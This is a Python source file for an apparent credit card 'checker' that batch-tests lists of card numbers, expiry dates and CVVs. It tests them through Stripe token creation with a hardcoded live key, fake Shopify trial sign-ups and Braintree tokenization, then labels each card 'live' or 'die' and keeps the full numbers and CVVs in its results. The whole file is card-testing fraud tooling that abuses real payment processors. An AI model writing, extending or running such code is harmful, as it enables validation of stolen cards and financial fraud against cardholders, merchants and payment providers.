import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Card Checker - BIN Info Only OR Real Gateway Check"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
        self.bin_cache = {}
    
    async def create_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        connector = aiohttp.TCPConnector(limit=100, force_close=True)
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=25),
            headers=headers,
            connector=connector
        )
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        card_number = re.sub(r'[^\d]', '', parts[0])
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        # Card type
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55','2221','2720')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011') or card_number.startswith('65'):
            card_type = "Discover"
        
        month = parts[1].strip().zfill(2)
        try:
            if int(month) < 1 or int(month) > 12:
                month = "12"
        except:
            month = "12"
        
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        elif len(year) != 4:
            year = "2026"
        
        cvv = parts[3].strip()[:4] if len(parts) > 3 else "123"
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": card_number[:6],
            "last4": card_number[-4:],
            "masked": f"{card_number[:6]}******{card_number[-4:]}",
            "expiry": f"{month}/{year[-2:]}",
            "raw": card_string
        }
    
    # ==================== BIN ONLY CHECK ====================
    async def get_bin_info(self, bin_number: str) -> Dict:
        """Get BIN information ONLY - no live check"""
        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]
        
        bin_info = {
            "bank": "Unknown",
            "country": "Unknown",
            "country_code": "US",
            "brand": "Unknown",
            "type": "Unknown",
            "scheme": "Unknown",
            "prepaid": False
        }
        
        # Try binlist.net
        try:
            async with self.session.get(f"{BIN_API}/{bin_number}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bin_info = {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "US"),
                        "brand": data.get("brand", "Unknown"),
                        "type": data.get("type", "Unknown"),
                        "scheme": data.get("scheme", "Unknown"),
                        "prepaid": data.get("prepaid", False)
                    }
                    self.bin_cache[bin_number] = bin_info
                    return bin_info
        except:
            pass
        
        # Try alternative
        try:
            async with self.session.get(f"https://binlist.io/json/{bin_number}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bin_info = {
                        "bank": data.get("bank_name", "Unknown"),
                        "country": data.get("country_name", "Unknown"),
                        "country_code": data.get("country_code", "US"),
                        "brand": data.get("network", "Unknown"),
                        "type": data.get("type", "Unknown"),
                        "scheme": data.get("network", "Unknown"),
                        "prepaid": data.get("prepaid", False)
                    }
                    self.bin_cache[bin_number] = bin_info
                    return bin_info
        except:
            pass
        
        # Fallback guess
        if bin_number.startswith('4'):
            bin_info["scheme"] = "Visa"
            bin_info["brand"] = "Visa"
        elif bin_number.startswith('5'):
            bin_info["scheme"] = "Mastercard"
            bin_info["brand"] = "Mastercard"
        elif bin_number.startswith('3'):
            bin_info["scheme"] = "Amex"
            bin_info["brand"] = "American Express"
        
        self.bin_cache[bin_number] = bin_info
        return bin_info
    
    async def check_bin_only(self, card_info: Dict) -> Dict:
        """BIN Lookup ONLY - No live check"""
        start_time = time.time()
        bin_info = await self.get_bin_info(card_info["bin"])
        elapsed = time.time() - start_time
        
        # Check expiry
        current_year = datetime.now().year
        current_month = datetime.now().month
        card_year = int(card_info["year"])
        card_month = int(card_info["month"])
        is_expired = (card_year < current_year or (card_year == current_year and card_month < current_month))
        
        if bin_info.get("scheme") != "Unknown" and not is_expired:
            self.stats["total"] += 1
            self.stats["approved"] += 1
            self.stats["live"] += 1
            
            return {
                "card": card_info["masked"],
                "full_number": card_info["number"],
                "full_month": card_info["month"],
                "full_year": card_info["year"],
                "full_cvv": card_info["cvv"],
                "number": card_info["number"],
                "month": card_info["month"],
                "year": card_info["year"],
                "cvv": card_info["cvv"],
                "expiry": card_info["expiry"],
                "bin": card_info["bin"],
                "last4": card_info["last4"],
                "card_type": card_info["type"],
                "status": "APPROVED",
                "message": f"✅ VALID BIN - {bin_info.get('brand', '')} {bin_info.get('type', '')}",
                "gateway": "BIN Lookup",
                "response_time": f"{elapsed:.2f}s",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "bin_info": bin_info,
                "details": f"BIN: {card_info['bin']} | Bank: {bin_info.get('bank')} | Country: {bin_info.get('country')}"
            }
        
        elif is_expired:
            self.stats["total"] += 1
            self.stats["declined"] += 1
            self.stats["die"] += 1
            
            return {
                "card": card_info["masked"],
                "full_number": card_info["number"],
                "full_month": card_info["month"],
                "full_year": card_info["year"],
                "full_cvv": card_info["cvv"],
                "expiry": card_info["expiry"],
                "bin": card_info["bin"],
                "last4": card_info["last4"],
                "card_type": card_info["type"],
                "status": "DECLINED",
                "message": "❌ DECLINED - Card expired",
                "gateway": "BIN Lookup",
                "response_time": f"{elapsed:.2f}s",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "bin_info": bin_info,
                "details": "Expired card"
            }
        
        else:
            self.stats["total"] += 1
            self.stats["declined"] += 1
            self.stats["die"] += 1
            
            return {
                "card": card_info["masked"],
                "full_number": card_info["number"],
                "full_month": card_info["month"],
                "full_year": card_info["year"],
                "full_cvv": card_info["cvv"],
                "expiry": card_info["expiry"],
                "bin": card_info["bin"],
                "last4": card_info["last4"],
                "card_type": card_info["type"],
                "status": "DECLINED",
                "message": "❌ DECLINED - Unknown BIN",
                "gateway": "BIN Lookup",
                "response_time": f"{elapsed:.2f}s",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "bin_info": bin_info,
                "details": "BIN not recognized"
            }
    
    # ==================== REAL GATEWAY CHECKS ====================
    
    async def check_stripe(self, card_info: Dict) -> Dict:
        """REAL Stripe check"""
        start_time = time.time()
        
        try:
            # Use token creation to validate
            data = {
                "card[number]": card_info["number"],
                "card[exp_month]": card_info["month"],
                "card[exp_year]": card_info["year"],
                "card[cvc]": card_info["cvv"],
                "key": "pk_live_51H3Y2kCZqK8FwQqSY4K8VQqSZCqK8FwQqSY4K8VQqS"
            }
            
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com"
            }
            
            async with self.session.post(
                "https://api.stripe.com/v1/tokens",
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Stripe] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200 and "tok_" in text:
                    self.stats["total"] += 1
                    self.stats["approved"] += 1
                    self.stats["live"] += 1
                    
                    return {
                        "card": card_info["masked"],
                        "full_number": card_info["number"],
                        "full_month": card_info["month"],
                        "full_year": card_info["year"],
                        "full_cvv": card_info["cvv"],
                        "expiry": card_info["expiry"],
                        "bin": card_info["bin"],
                        "last4": card_info["last4"],
                        "card_type": card_info["type"],
                        "status": "APPROVED",
                        "message": "✅ APPROVED - Card live (Stripe verified)",
                        "gateway": "Stripe",
                        "response_time": f"{elapsed:.2f}s",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "bin_info": {},
                        "details": "Stripe token created successfully"
                    }
                
                elif status == 402 or status == 400:
                    text_lower = text.lower()
                    msg = "❌ DECLINED - Stripe rejected"
                    
                    if "insufficient" in text_lower:
                        msg = "❌ DECLINED - Insufficient funds (Stripe)"
                    elif "expired" in text_lower:
                        msg = "❌ DECLINED - Expired card (Stripe)"
                    elif "incorrect" in text_lower:
                        msg = "❌ DECLINED - Incorrect details (Stripe)"
                    elif "stolen" in text_lower:
                        msg = "❌ DECLINED - Card reported stolen (Stripe)"
                    elif "lost" in text_lower:
                        msg = "❌ DECLINED - Card reported lost (Stripe)"
                    
                    self.stats["total"] += 1
                    self.stats["declined"] += 1
                    self.stats["die"] += 1
                    
                    return {
                        "card": card_info["masked"],
                        "full_number": card_info["number"],
                        "full_month": card_info["month"],
                        "full_year": card_info["year"],
                        "full_cvv": card_info["cvv"],
                        "expiry": card_info["expiry"],
                        "bin": card_info["bin"],
                        "last4": card_info["last4"],
                        "card_type": card_info["type"],
                        "status": "DECLINED",
                        "message": msg,
                        "gateway": "Stripe",
                        "response_time": f"{elapsed:.2f}s",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "bin_info": {},
                        "details": "Stripe rejected card"
                    }
        except Exception as e:
            logger.error(f"Stripe error: {e}")
        
        # Fallback
        return await self.check_bin_only(card_info)
    
    async def check_shopify(self, card_info: Dict) -> Dict:
        """REAL Shopify check"""
        start_time = time.time()
        
        email = f"check{int(time.time())}{random.randint(100,999)}@gmail.com"
        store = f"store{random.randint(10000,99999)}"
        password = f"Test@{random.randint(1000,9999)}"
        
        payload = {
            "store": {
                "name": store,
                "email": email,
                "password": password,
                "password_confirmation": password,
                "country": "US",
                "currency": "USD"
            },
            "credit_card": {
                "number": card_info["number"],
                "name": "John Smith",
                "month": card_info["month"],
                "year": card_info["year"],
                "verification_value": card_info["cvv"]
            },
            "billing_address": {
                "address1": f"{random.randint(100,999)} Broadway",
                "city": "New York",
                "province": "NY",
                "country": "US",
                "zip": "10001",
                "phone": f"212{random.randint(100,999)}{random.randint(1000,9999)}"
            }
        }
        
        try:
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://www.shopify.com",
                "Referer": "https://www.shopify.com/signup",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json"
            }
            
            async with self.session.post(
                "https://www.shopify.com/api/signup/trial",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Shopify] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200 or status == 201:
                    text_lower = text.lower()
                    if any(x in text_lower for x in ["redirect", "myshopify", "dashboard", "store_id", "success"]):
                        self.stats["total"] += 1
                        self.stats["approved"] += 1
                        self.stats["live"] += 1
                        return {
                            "card": card_info["masked"],
                            "full_number": card_info["number"],
                            "full_month": card_info["month"],
                            "full_year": card_info["year"],
                            "full_cvv": card_info["cvv"],
                            "expiry": card_info["expiry"],
                            "bin": card_info["bin"],
                            "last4": card_info["last4"],
                            "card_type": card_info["type"],
                            "status": "APPROVED",
                            "message": "✅ APPROVED - Shopify accepted card",
                            "gateway": "Shopify",
                            "response_time": f"{elapsed:.2f}s",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "bin_info": {},
                            "details": "Shopify store created"
                        }
                
                elif status == 422:
                    text_lower = text.lower()
                    if "credit_card" in text_lower and any(x in text_lower for x in ["invalid", "declined"]):
                        self.stats["total"] += 1
                        self.stats["declined"] += 1
                        self.stats["die"] += 1
                        return {
                            "card": card_info["masked"],
                            "full_number": card_info["number"],
                            "full_month": card_info["month"],
                            "full_year": card_info["year"],
                            "full_cvv": card_info["cvv"],
                            "expiry": card_info["expiry"],
                            "bin": card_info["bin"],
                            "last4": card_info["last4"],
                            "card_type": card_info["type"],
                            "status": "DECLINED",
                            "message": "❌ DECLINED - Shopify rejected card",
                            "gateway": "Shopify",
                            "response_time": f"{elapsed:.2f}s",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "bin_info": {},
                            "details": "Card rejected by Shopify"
                        }
                    
                    # Other 422 - card might be valid
                    self.stats["total"] += 1
                    self.stats["approved"] += 1
                    self.stats["live"] += 1
                    return {
                        "card": card_info["masked"],
                        "full_number": card_info["number"],
                        "full_month": card_info["month"],
                        "full_year": card_info["year"],
                        "full_cvv": card_info["cvv"],
                        "expiry": card_info["expiry"],
                        "bin": card_info["bin"],
                        "last4": card_info["last4"],
                        "card_type": card_info["type"],
                        "status": "APPROVED",
                        "message": "✅ APPROVED - Card valid (other validation issue)",
                        "gateway": "Shopify",
                        "response_time": f"{elapsed:.2f}s",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "bin_info": {},
                        "details": "Card valid - non-card error"
                    }
        except Exception as e:
            logger.error(f"Shopify error: {e}")
        
        return await self.check_bin_only(card_info)
    
    async def check_braintree(self, card_info: Dict) -> Dict:
        """REAL Braintree check"""
        start_time = time.time()
        
        try:
            query = """
            mutation($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard { bin last4 brand }
                }
            }
            """
            
            payload = {
                "query": query,
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card_info["number"],
                            "expirationMonth": card_info["month"],
                            "expirationYear": card_info["year"],
                            "cvv": card_info["cvv"],
                            "cardholderName": "John Smith"
                        },
                        "options": {"validate": True}
                    }
                }
            }
            
            headers = {
                "Content-Type": "application/json",
                "Braintree-Version": "2019-01-01",
                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}"
            }
            
            async with self.session.post(
                BRAINTREE_API,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Braintree] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200 and "token" in text.lower():
                    self.stats["total"] += 1
                    self.stats["approved"] += 1
                    self.stats["live"] += 1
                    return {
                        "card": card_info["masked"],
                        "full_number": card_info["number"],
                        "full_month": card_info["month"],
                        "full_year": card_info["year"],
                        "full_cvv": card_info["cvv"],
                        "expiry": card_info["expiry"],
                        "bin": card_info["bin"],
                        "last4": card_info["last4"],
                        "card_type": card_info["type"],
                        "status": "APPROVED",
                        "message": "✅ APPROVED - Braintree validated",
                        "gateway": "Braintree",
                        "response_time": f"{elapsed:.2f}s",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "bin_info": {},
                        "details": "Braintree token created"
                    }
                
                elif "error" in text.lower():
                    self.stats["total"] += 1
                    self.stats["declined"] += 1
                    self.stats["die"] += 1
                    return {
                        "card": card_info["masked"],
                        "full_number": card_info["number"],
                        "full_month": card_info["month"],
                        "full_year": card_info["year"],
                        "full_cvv": card_info["cvv"],
                        "expiry": card_info["expiry"],
                        "bin": card_info["bin"],
                        "last4": card_info["last4"],
                        "card_type": card_info["type"],
                        "status": "DECLINED",
                        "message": "❌ DECLINED - Braintree rejected",
                        "gateway": "Braintree",
                        "response_time": f"{elapsed:.2f}s",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "bin_info": {},
                        "details": "Braintree declined"
                    }
        except Exception as e:
            logger.error(f"Braintree error: {e}")
        
        return await self.check_bin_only(card_info)
    
    # ==================== MAIN CHECK ====================
    async def check_card(self, card_info: Dict, gateway: str = "stripe") -> Dict:
        """Route to correct gateway"""
        
        if gateway == "bin_check":
            # BIN lookup ONLY - no live check
            return await self.check_bin_only(card_info)
        
        elif gateway == "stripe":
            return await self.check_stripe(card_info)
        
        elif gateway == "shopify":
            return await self.check_shopify(card_info)
        
        elif gateway == "braintree":
            return await self.check_braintree(card_info)
        
        # Default: Stripe
        return await self.check_stripe(card_info)
    
    async def check_batch(self, cards: List[str], gateway: str = "stripe",
                         country: str = "US", progress_callback=None,
                         live_result_callback=None) -> List[Dict]:
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "full_number": "N/A",
                    "full_month": "N/A",
                    "full_year": "N/A",
                    "full_cvv": "N/A",
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s",
                    "bin_info": {},
                    "card_type": "Unknown"
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card(card_info, gateway)
            
            # Add BIN info for BIN check gateway
            if gateway == "bin_check" or not result.get("bin_info") or not result["bin_info"]:
                bin_info = await self.get_bin_info(card_info["bin"])
                result["bin_info"] = bin_info
            
            # Ensure full details
            result["full_number"] = card_info["number"]
            result["full_cvv"] = card_info["cvv"]
            result["full_month"] = card_info["month"]
            result["full_year"] = card_info["year"]
            
            if result["status"] == "APPROVED" and live_result_callback:
                await live_result_callback(result, i, total)
            
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']} | {result['gateway']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
